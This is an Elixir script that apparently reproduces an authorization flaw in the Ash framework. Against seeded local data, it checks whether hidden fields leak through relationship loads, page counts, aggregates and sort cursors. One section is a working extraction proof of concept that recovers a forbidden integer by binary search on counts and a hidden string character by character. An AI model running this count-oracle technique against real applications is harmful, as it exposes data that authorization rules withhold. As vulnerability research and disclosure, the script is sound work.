require Ash.Query
require Ash.Expr
import Ash.Expr, only: [expr: 1]
dl = System.get_env("DL", "pg")
ns = if dl == "pg", do: Ashbug.Pg, else: Ashbug.Ets
org_r = Module.concat(ns, Org); task_r = Module.concat(ns, Task); link_r = Module.concat(ns, Link)
show_sql? = System.get_env("SQL") == "1"

IO.puts("\n######## data layer=#{dl}  ash=#{Application.spec(:ash, :vsn)} ash_postgres=#{Application.spec(:ash_postgres, :vsn)} ash_sql=#{Application.spec(:ash_sql, :vsn)}  demo flags=#{System.get_env("ASHBUG_FLAGS") == "1"}")
IO.puts("config :ash = #{inspect(Application.get_all_env(:ash), limit: :infinity)}")

# ---- SQL capture
Process.put(:sql, [])
parent = self()
:telemetry.attach("sql", [:ashbug, :repo, :query], fn _, _, meta, _ -> send(parent, {:sql, meta.query, meta.params}) end, nil)
drain = fn ->
  Stream.repeatedly(fn -> receive do {:sql, q, p} -> {q, p} after 0 -> nil end end) |> Enum.take_while(& &1)
end

# ---- seed: KNOWN values
uuid = fn n -> "00000000-0000-0000-0000-" <> String.pad_leading(Integer.to_string(n), 12, "0") end
admin = %{id: uuid.(901), role: :admin}
member = %{id: uuid.(902), role: :member}
other = uuid.(903)
org_a = uuid.(1); org_b = uuid.(2)

if dl == "pg", do: Ashbug.Repo.query!("TRUNCATE tasks, links, orgs")
Ash.create!(org_r, %{id: org_a, name: "A"}, authorize?: false)
Ash.create!(org_r, %{id: org_b, name: "B"}, authorize?: false)
# Org A: 10 tasks, hours 5,10,...,50; secret 1..10; tasks 1..3 owned by the member, 4..10 by someone else
for i <- 1..10 do
  id = uuid.(100 + i)
  Ash.create!(task_r, %{id: id, title: "A#{String.pad_leading("#{i}", 2, "0")}", hours: i * 5, secret: i, code: "C#{i}X", owner_id: (if i <= 3, do: member.id, else: other), org_id: org_a}, authorize?: false)
  Ash.create!(link_r, %{org_id: org_a, task_id: id}, authorize?: false)
end
# Org B: 4 tasks (to prove the count is scoped to the relationship), all owned by the member
for i <- 1..4 do
  id = uuid.(200 + i)
  Ash.create!(task_r, %{id: id, title: "B#{i}", hours: 100, secret: 100, code: "B", owner_id: member.id, org_id: org_b}, authorize?: false)
  Ash.create!(link_r, %{org_id: org_b, task_id: id}, authorize?: false)
end
drain.()

IO.puts("""
SEED (org A): 10 tasks, hours = 5,10,..,50, secret = 1..10. Member owns A01..A03 (hours 5,10,15) -> sees `hours` on those 3 only; never sees `secret`.
EXPECTED            | true (admin) | member sees
hours > 10          |      8       |   1  (A03 = 15)
secret > 0          |     10       |   0   (integer, never visible)
code contains "C"   |     10       |   0   (string, never visible; codes are "C1X".."C10X")
hours is_nil        |      0       |   7  (the 7 hidden ones read as nil)
no filter           |     10       |  10
""")

filters = %{
  "none" => {nil, nil},
  "hours > 10" => {%{hours: %{greater_than: 10}}, expr(hours > 10)},
  "secret > 0" => {%{secret: %{greater_than: 0}}, expr(secret > 0)},
  "code contains C" => {%{code: %{contains: "C"}}, expr(contains(code, "C"))},
  "hours is_nil" => {%{hours: %{is_nil: true}}, expr(is_nil(hours))}
}
forder = ["none", "hours > 10", "code contains C", "secret > 0", "hours is_nil"]

apply_filter = fn q, fname, kind ->
  {inp, ex} = filters[fname]
  cond do
    inp == nil -> q
    kind == :filter_input -> Ash.Query.filter_input(q, inp)
    kind == :filter -> Ash.Query.filter(q, ^ex)
  end
end

# how the RELATED query is built
act = fn page -> if Keyword.has_key?(page, :offset), do: :paged, else: :keyset_only end
builds = %{
  "for_read(actor) |> filter |> page" => fn a, f, k, page -> task_r |> Ash.Query.for_read(act.(page), %{}, actor: a) |> apply_filter.(f, k) |> Ash.Query.page(page) end,
  "filter |> for_read(actor) |> page" => fn a, f, k, page -> task_r |> Ash.Query.new() |> apply_filter.(f, k) |> Ash.Query.for_read(:paged, %{}, actor: a) |> Ash.Query.page(page) end,
  "for_read(actor, authorize?: true)" => fn a, f, k, page -> task_r |> Ash.Query.for_read(:paged, %{}, actor: a, authorize?: true) |> apply_filter.(f, k) |> Ash.Query.page(page) end,
  "no for_read (plain query)" => fn _a, f, k, page -> task_r |> Ash.Query.new() |> apply_filter.(f, k) |> Ash.Query.page(page) end,
  "for_read WITHOUT actor" => fn _a, f, k, page -> task_r |> Ash.Query.for_read(:paged, %{}) |> apply_filter.(f, k) |> Ash.Query.page(page) end
}

fmt = fn
  %{results: r, count: c, more?: m} = p -> "#{p.__struct__ |> Module.split() |> List.last() |> String.pad_trailing(6)} rows=#{length(r)} count=#{inspect(c)} more?=#{m}  #{inspect(Enum.map(r, & &1.title))}"
  l when is_list(l) -> "LIST rows=#{length(l)}"
  other -> inspect(other, limit: 5)
end
safe = fn fun -> try do fun.() rescue e -> "RAISED " <> (Exception.message(e) |> String.replace(~r/\s+/, " ") |> String.replace(~r/^.*?\* /, "") |> String.slice(0, 110)) end end
print_sql = fn label ->
  qs = drain.()
  if show_sql? do
    IO.puts("   -- SQL for: #{label}")
    for {q, p} <- qs, do: IO.puts("   SQL> #{q}\n        params=#{inspect(p, limit: 20)}")
  end
end

pages = [offset: [limit: 5, offset: 0, count: true], keyset: [limit: 5, count: true]]

IO.puts("===== 1. TOP-LEVEL read: Ash.read(query |> filter(org_id == A), page: [..count: true], actor: a)")
for {aname, a} <- [admin: admin, member: member], kind <- [:filter_input, :filter], {pt, page} <- pages, f <- forder do
  r = safe.(fn ->
    task_r |> Ash.Query.for_read(act.(page), %{}, actor: a) |> apply_filter.(f, kind) |> Ash.Query.filter(org_id == ^org_a) |> Ash.Query.sort(:title)
    |> Ash.read!(page: page, actor: a) |> fmt.() end)
  IO.puts("#{aname |> to_string |> String.pad_trailing(6)} | #{kind |> to_string |> String.pad_trailing(12)} | #{pt |> to_string |> String.pad_trailing(6)} | #{String.pad_trailing(f, 15)} | #{r}")
  if aname == :member and kind == :filter_input and pt == :offset, do: print_sql.("top-level, member, #{f}"), else: drain.()
end

IO.puts("\n===== 1b. TOP-LEVEL Ash.count and Ash.aggregate, member, filter_input")
for f <- forder do
  c = safe.(fn -> task_r |> Ash.Query.for_read(:paged, %{}, actor: member) |> apply_filter.(f, :filter_input) |> Ash.Query.filter(org_id == ^org_a) |> Ash.count!(actor: member) end)
  IO.puts("member | Ash.count | #{String.pad_trailing(f, 15)} | #{inspect(c)}")
  print_sql.("Ash.count, member, #{f}")
end

IO.puts("\n===== 2. RELATIONSHIP load, the colleague's form: Ash.get(Org, A, load: [{rel, related_query}], actor: a)")
for rel <- [:tasks, :linked_tasks], {aname, a} <- [admin: admin, member: member], kind <- [:filter_input, :filter], {pt, page} <- pages, f <- forder do
  r = safe.(fn ->
    rq = builds["for_read(actor) |> filter |> page"].(a, f, kind, page) |> Ash.Query.sort(:title)
    Ash.get!(org_r, org_a, load: [{rel, rq}], actor: a) |> Map.fetch!(rel) |> fmt.() end)
  IO.puts("#{rel |> to_string |> String.pad_trailing(12)} | #{aname |> to_string |> String.pad_trailing(6)} | #{kind |> to_string |> String.pad_trailing(12)} | #{pt |> to_string |> String.pad_trailing(6)} | #{String.pad_trailing(f, 15)} | #{r}")
  if aname == :member and kind == :filter_input and pt == :offset, do: print_sql.("#{rel}, member, #{f}"), else: drain.()
end

IO.puts("\n===== 3. How the related query is built (member, has_many :tasks, offset page, filter_input) and how it is loaded")
loaders = %{
  "Ash.get(load:)" => fn rq, a -> Ash.get!(org_r, org_a, load: [tasks: rq], actor: a).tasks end,
  "Ash.load(record)" => fn rq, a -> (Ash.get!(org_r, org_a, actor: a) |> Ash.load!([tasks: rq], actor: a)).tasks end,
  "Ash.Query.load |> read_one" => fn rq, a -> (org_r |> Ash.Query.for_read(:read, %{}, actor: a) |> Ash.Query.filter(id == ^org_a) |> Ash.Query.load(tasks: rq) |> Ash.read_one!(actor: a)).tasks end,
  "Ash.get(load:, authorize?: true)" => fn rq, a -> Ash.get!(org_r, org_a, load: [tasks: rq], actor: a, authorize?: true).tasks end
}
for {bname, b} <- Enum.sort(builds), {lname, l} <- Enum.sort(loaders), f <- ["hours > 10", "code contains C"] do
  r = safe.(fn -> b.(member, f, :filter_input, pages[:offset]) |> Ash.Query.sort(:title) |> l.(member) |> fmt.() end)
  IO.puts("#{String.pad_trailing(bname, 34)} | #{String.pad_trailing(lname, 33)} | #{String.pad_trailing(f, 15)} | #{r}")
  drain.()
end

IO.puts("\n===== 4. The same count asked for directly: Ash.Query.aggregate(:n, :count, :tasks, query: q) on the parent, member")
for kind <- [:filter_input, :filter], f <- forder do
  r = safe.(fn ->
    q = task_r |> Ash.Query.new() |> apply_filter.(f, kind)
    (org_r |> Ash.Query.for_read(:read, %{}, actor: member) |> Ash.Query.filter(id == ^org_a) |> Ash.Query.aggregate(:n, :count, :tasks, query: q) |> Ash.read_one!(actor: member)).aggregates.n end)
  IO.puts("member | #{kind |> to_string |> String.pad_trailing(12)} | #{String.pad_trailing(f, 15)} | n=#{inspect(r)}")
  drain.()
end

IO.puts("\n===== 5. Without count: does more? / page walking leak? member, has_many :tasks, limit 1, filter_input")
for f <- ["hours > 10", "code contains C"], {pt, page} <- [offset: [limit: 1, offset: 0], keyset: [limit: 1]] do
  r = safe.(fn ->
    rq = builds["for_read(actor) |> filter |> page"].(member, f, :filter_input, page) |> Ash.Query.sort(:title)
    Ash.get!(org_r, org_a, load: [tasks: rq], actor: member).tasks |> fmt.() end)
  IO.puts("#{pt |> to_string |> String.pad_trailing(6)} | #{String.pad_trailing(f, 15)} | #{r}")
  drain.()
end
for off <- [0, 1, 2, 7, 8] do
  r = safe.(fn ->
    rq = builds["for_read(actor) |> filter |> page"].(member, "hours > 10", :filter_input, [limit: 1, offset: off]) |> Ash.Query.sort(:title)
    Ash.get!(org_r, org_a, load: [tasks: rq], actor: member).tasks |> fmt.() end)
  IO.puts("offset=#{off} | hours > 10 | #{r}")
  drain.()
end

IO.puts("\n===== 6. EXTRACTION by the member through the relationship count (has_many :tasks, offset page limit 1, count: true)")
count_of = fn input ->
  rq = task_r |> Ash.Query.for_read(:paged, %{}, actor: member) |> Ash.Query.filter_input(input) |> Ash.Query.page(limit: 1, offset: 0, count: true)
  p = Ash.get!(org_r, org_a, load: [tasks: rq], actor: member).tasks
  {p.count, length(p.results)}
end
# (a) hidden integer `hours` of task A07 (true value 35; the member does not own A07) by binary search
{lo, hi, n} = Enum.reduce_while(1..40, {0, 1_000, 0}, fn _, {lo, hi, n} ->
  if lo >= hi, do: {:halt, {lo, hi, n}}, else: (
    mid = div(lo + hi, 2)
    {c, _rows} = count_of.(%{and: [%{title: %{eq: "A07"}}, %{hours: %{greater_than: mid}}]})
    {:cont, if(c > 0, do: {mid + 1, hi, n + 1}, else: {lo, mid, n + 1})})
end)
shown = Ash.get!(org_r, org_a, load: [tasks: task_r |> Ash.Query.for_read(:paged, %{}, actor: member) |> Ash.Query.filter_input(%{title: %{eq: "A07"}})], actor: member).tasks |> hd()
IO.puts("A07 as the member reads it: hours=#{inspect(shown.hours)} code=#{inspect(shown.code)}")
IO.puts("recovered hours of A07 = #{lo} (hi=#{hi}) in #{n} requests; true value 35; rows returned by those requests: 0")
# (b) hidden string `code` of task A07 (true value "C7X"), one character at a time with `contains`... using eq on candidates
alphabet = ~w(A B C X 0 1 2 3 4 5 6 7 8 9)
{code, n2} = Enum.reduce_while(1..10, {"", 0}, fn _, {prefix, n} ->
  {c, _} = count_of.(%{and: [%{title: %{eq: "A07"}}, %{code: %{eq: prefix}}]})
  if c > 0 and prefix != "" do {:halt, {prefix, n + 1}} else
    found = Enum.find(alphabet, fn ch ->
      {c, _} = count_of.(%{and: [%{title: %{eq: "A07"}}, %{code: %{contains: prefix <> ch}}]})
      c > 0 end)
    if found, do: {:cont, {prefix <> found, n + 1 + length(alphabet)}}, else: {:halt, {prefix, n + 1}}
  end
end)
IO.puts("recovered code of A07 = #{inspect(code)} (true value \"C7X\"), at most #{n2} requests")
drain.()

IO.puts("\n===== 7. sort_input on a hidden field (member, org A, limit 10): order and keyset cursor contents")
decode = fn cursor -> cursor |> Base.decode64!() |> :erlang.binary_to_term([:safe]) end
top = task_r |> Ash.Query.for_read(:keyset_only, %{}, actor: member) |> Ash.Query.sort_input("-hours") |> Ash.Query.filter(org_id == ^org_a) |> Ash.read!(page: [limit: 10], actor: member)
IO.puts("top-level   sort_input -hours: " <> inspect(Enum.map(top.results, &{&1.title, &1.hours, decode.(&1.__metadata__.keyset)}), limit: :infinity))
rq = task_r |> Ash.Query.for_read(:keyset_only, %{}, actor: member) |> Ash.Query.sort_input("-hours") |> Ash.Query.page(limit: 10)
rel = Ash.get!(org_r, org_a, load: [tasks: rq], actor: member).tasks
IO.puts("related     sort_input -hours: " <> inspect(Enum.map(rel.results, &{&1.title, &1.hours, decode.(&1.__metadata__.keyset)}), limit: :infinity))
rq = task_r |> Ash.Query.for_read(:keyset_only, %{}, actor: member) |> Ash.Query.sort(hours: :desc) |> Ash.Query.page(limit: 10)
rel = Ash.get!(org_r, org_a, load: [tasks: rq], actor: member).tasks
IO.puts("related     sort (not input) -hours [developer sort, not expected to be protected]: " <> inspect(Enum.map(rel.results, &{&1.title, &1.hours, decode.(&1.__metadata__.keyset)}), limit: :infinity))
print_sql.("sorts")
